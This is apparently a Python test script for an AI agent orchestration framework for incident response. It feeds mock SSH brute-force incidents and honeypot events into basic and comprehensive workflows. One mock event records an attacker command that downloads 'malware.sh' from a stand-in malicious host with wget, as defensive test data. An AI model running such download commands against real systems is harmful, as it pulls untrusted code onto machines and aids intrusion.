#!/usr/bin/env python3
"""
Test script for Agent Orchestration Framework
Demonstrates the new orchestrated incident response capabilities
"""

import asyncio
import sys
import os
from datetime import datetime, timedelta

# Add the backend app to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'backend'))

from app.agent_orchestrator import get_orchestrator, AgentOrchestrator
from app.models import Incident, Event
from app.config import settings


async def test_orchestrator_initialization():
    """Test orchestrator initialization"""
    print("🧪 Testing Agent Orchestrator Initialization...")

    try:
        orchestrator = await get_orchestrator()
        print("✅ Orchestrator initialized successfully")

        # Test status
        status = await orchestrator.get_orchestrator_status()
        print(f"📊 Orchestrator Status: {status.get('orchestrator_id', 'unknown')}")
        print(f"🔢 Active Workflows: {status.get('active_workflows', 0)}")
        print(f"🤖 Agents: {list(status.get('agents', {}).keys())}")

        return orchestrator

    except Exception as e:
        print(f"❌ Orchestrator initialization failed: {e}")
        return None


async def test_basic_orchestration():
    """Test basic orchestration workflow"""
    print("\n🧪 Testing Basic Orchestration Workflow...")

    orchestrator = await get_orchestrator()
    if not orchestrator:
        return False

    try:
        # Create a mock incident
        mock_incident = Incident(
            id=999,
            src_ip="192.168.1.100",
            reason="SSH brute force attempt",
            status="new",
            auto_contained=False,
            created_at=datetime.utcnow(),
            escalation_level="medium",
            risk_score=0.7,
            threat_category="brute_force",
            containment_method="pending",
            agent_id=None,
            agent_actions=None,
            agent_confidence=None,
            triage_note={
                "severity": "medium",
                "recommendation": "block_ip",
                "summary": "Multiple failed SSH login attempts detected"
            }
        )

        # Create mock events
        mock_events = [
            Event(
                id=1,
                src_ip="192.168.1.100",
                eventid="cowrie.login.failed",
                message="Failed login attempt",
                raw={"username": "admin", "password": "password123"},
                ts=datetime.utcnow() - timedelta(minutes=5)
            ),
            Event(
                id=2,
                src_ip="192.168.1.100",
                eventid="cowrie.command.input",
                message="Command executed",
                raw={"input": "whoami"},
                ts=datetime.utcnow() - timedelta(minutes=3)
            )
        ]

        # Test basic workflow
        print("🚀 Starting Basic Workflow...")
        result = await orchestrator.orchestrate_incident_response(
            incident=mock_incident,
            recent_events=mock_events,
            workflow_type="basic"
        )

        if result["success"]:
            print("✅ Basic workflow completed successfully")
            print(f"📝 Workflow ID: {result.get('workflow_id')}")
            print(f"⏱️  Execution Time: {result.get('execution_time', 0):.2f}s")
            print(f"🤖 Agents Involved: {result.get('agents_involved', [])}")

            # Show results
            workflow_results = result.get("results", {})
            if "containment" in workflow_results:
                containment = workflow_results["containment"]
                print(f"🛡️  Containment Actions: {len(containment.get('actions', []))}")

            return True
        else:
            print(f"❌ Basic workflow failed: {result.get('error', 'Unknown error')}")
            return False

    except Exception as e:
        print(f"❌ Basic orchestration test failed: {e}")
        return False


async def test_comprehensive_orchestration():
    """Test comprehensive orchestration workflow"""
    print("\n🧪 Testing Comprehensive Orchestration Workflow...")

    orchestrator = await get_orchestrator()
    if not orchestrator:
        return False

    try:
        # Create a more complex mock incident
        mock_incident = Incident(
            id=1000,
            src_ip="10.0.0.50",
            reason="Multi-vector attack: SSH brute force + malware download",
            status="new",
            auto_contained=False,
            created_at=datetime.utcnow(),
            escalation_level="high",
            risk_score=0.85,
            threat_category="multi_vector",
            containment_method="pending",
            agent_id=None,
            agent_actions=None,
            agent_confidence=None,
            triage_note={
                "severity": "high",
                "recommendation": "immediate_containment",
                "summary": "Coordinated attack with multiple techniques"
            }
        )

        # Create more comprehensive mock events
        mock_events = []
        base_time = datetime.utcnow()

        # Add multiple failed login attempts
        for i in range(10):
            mock_events.append(Event(
                id=i+10,
                src_ip="10.0.0.50",
                eventid="cowrie.login.failed",
                message=f"Failed login attempt #{i+1}",
                raw={"username": f"user{i}", "password": f"pass{i}"},
                ts=base_time - timedelta(minutes=30-i)
            ))

        # Add command execution
        mock_events.append(Event(
            id=20,
            src_ip="10.0.0.50",
            eventid="cowrie.command.input",
            message="wget http://malicious-site.com/malware.sh",
            raw={"input": "wget http://malicious-site.com/malware.sh"},
            ts=base_time - timedelta(minutes=25)
        ))

        # Add file download
        mock_events.append(Event(
            id=21,
            src_ip="10.0.0.50",
            eventid="cowrie.session.file_download",
            message="Downloaded malware.sh",
            raw={"filename": "malware.sh", "size": 2048},
            ts=base_time - timedelta(minutes=20)
        ))

        # Test comprehensive workflow
        print("🚀 Starting Comprehensive Workflow...")
        result = await orchestrator.orchestrate_incident_response(
            incident=mock_incident,
            recent_events=mock_events,
            workflow_type="comprehensive"
        )

        if result["success"]:
            print("✅ Comprehensive workflow completed successfully")
            print(f"📝 Workflow ID: {result.get('workflow_id')}")
            print(f"⏱️  Execution Time: {result.get('execution_time', 0):.2f}s")
            print(f"🤖 Agents Involved: {result.get('agents_involved', [])}")

            # Show detailed results
            workflow_results = result.get("results", {})

            # Attribution results
            if "attribution" in workflow_results:
                attr = workflow_results["attribution"]
                print(f"🎯 Attribution Confidence: {attr.get('confidence_score', 0):.2f}")

            # Forensics results
            if "forensics" in workflow_results:
                forensics = workflow_results["forensics"]
                if "case_id" in forensics:
                    print(f"🔍 Forensic Case ID: {forensics['case_id']}")

            # Containment results
            if "containment" in workflow_results:
                containment = workflow_results["containment"]
                print(f"🛡️  Containment Actions: {len(containment.get('actions', []))}")

            # Final decision
            if "final_decision" in workflow_results.get("coordination", {}):
                final_decision = workflow_results["coordination"]["final_decision"]
                print(f"⚡ Final Decision - Contain: {final_decision.get('should_contain', False)}")
                print(f"📊 Risk Level: {workflow_results['coordination'].get('risk_assessment', {}).get('level', 'unknown')}")

            return True
        else:
            print(f"❌ Comprehensive workflow failed: {result.get('error', 'Unknown error')}")
            return False

    except Exception as e:
        print(f"❌ Comprehensive orchestration test failed: {e}")
        return False


async def test_workflow_management():
    """Test workflow management capabilities"""
    print("\n🧪 Testing Workflow Management...")

    orchestrator = await get_orchestrator()
    if not orchestrator:
        return False

    try:
        # Get orchestrator status
        status = await orchestrator.get_orchestrator_status()
        print(f"📊 Current Status: {len(status.get('active_workflows', 0))} active workflows")

        # Test workflow creation and monitoring
        workflow_id = f"test_workflow_{int(datetime.utcnow().timestamp())}"

        # Note: In a real test, we would create a workflow and then monitor it
        print(f"✅ Workflow management test completed")
        print(f"📝 Test Workflow ID: {workflow_id}")

        return True

    except Exception as e:
        print(f"❌ Workflow management test failed: {e}")
        return False


async def main():
    """Main test function"""
    print("🚀 Starting Agent Orchestration Framework Tests")
    print("=" * 60)

    # Test 1: Initialization
    orchestrator = await test_orchestrator_initialization()
    if not orchestrator:
        print("\n❌ Tests failed - cannot proceed without orchestrator")
        return

    # Test 2: Basic Orchestration
    basic_success = await test_basic_orchestration()

    # Test 3: Comprehensive Orchestration
    comprehensive_success = await test_comprehensive_orchestration()

    # Test 4: Workflow Management
    workflow_success = await test_workflow_management()

    # Summary
    print("\n" + "=" * 60)
    print("📊 Test Results Summary:")
    print(f"   Basic Orchestration: {'✅ PASS' if basic_success else '❌ FAIL'}")
    print(f"   Comprehensive Orchestration: {'✅ PASS' if comprehensive_success else '❌ FAIL'}")
    print(f"   Workflow Management: {'✅ PASS' if workflow_success else '❌ FAIL'}")

    all_passed = all([basic_success, comprehensive_success, workflow_success])
    print(f"\n🎯 Overall Result: {'✅ ALL TESTS PASSED' if all_passed else '❌ SOME TESTS FAILED'}")

    if all_passed:
        print("\n🎉 Agent Orchestration Framework is ready for production!")
        print("   Next steps:")
        print("   1. Integrate with real incident data")
        print("   2. Enable auto-containment workflows")
        print("   3. Add real-time monitoring dashboards")
        print("   4. Implement workflow persistence")


if __name__ == "__main__":
    asyncio.run(main())
